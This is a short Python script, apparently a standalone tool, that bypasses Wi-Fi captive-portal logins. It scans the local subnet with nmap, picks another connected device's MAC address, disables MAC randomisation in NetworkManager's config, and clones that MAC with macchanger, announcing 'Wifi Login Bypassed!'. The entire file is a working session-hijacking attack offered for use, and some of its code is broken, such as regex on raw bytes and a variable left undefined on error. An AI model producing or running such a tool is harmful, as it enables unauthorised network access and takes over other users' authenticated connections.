import subprocess, re, time

def main():
    i = input("Enter wifi interface: ")
    p = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
    data = p.communicate()[0]
    try:
        m = re.findall(i + ':(.*?)inet (.*?) netmask', data, re.DOTALL)[0][1].split()[0]
    except Exception as e:
        print(e)

    p = subprocess.Popen(["nmap", "-sP", m + "/24"], stdout=subprocess.PIPE)
    data = p.communicate()[0]
    try:
        m = re.findall('MAC Address: (.*?) ', data, re.DOTALL)
    except Exception as e:
        print(e)

    mac = m[int(len(m) / 2) + 1]

    p = subprocess.Popen(["sudo", "cat", "/etc/NetworkManager/NetworkManager.conf"], stdout=subprocess.PIPE)
    data = p.communicate()[0]

    try:
        m = re.findall('wifi.scan-rand-mac-address=no', data, re.DOTALL)
    except Exception as e:
        print(e)

    if not len(m):
        print(1)
        f = open('/etc/NetworkManager/NetworkManager.conf', 'a')
        f.write("\n\n[device]\nwifi.scan-rand-mac-address=no")
        f.close()
        subprocess.Popen(["sudo", "service", "network-manager", "restart"], stdout=subprocess.PIPE)

    p = subprocess.Popen(["sudo", "ifconfig", i, "down"], stdout=subprocess.PIPE)
    print(1)
    p = subprocess.Popen(["sudo", "macchanger", "--mac", mac, i], stdout=subprocess.PIPE)
    p = subprocess.Popen(["sudo", "ifconfig", i, "up"], stdout=subprocess.PIPE)
    p = subprocess.Popen(["sudo", "service", "network-manager", "restart"], stdout=subprocess.PIPE)
    data = p.communicate()
    print("Wifi Login Bypassed!")

main()
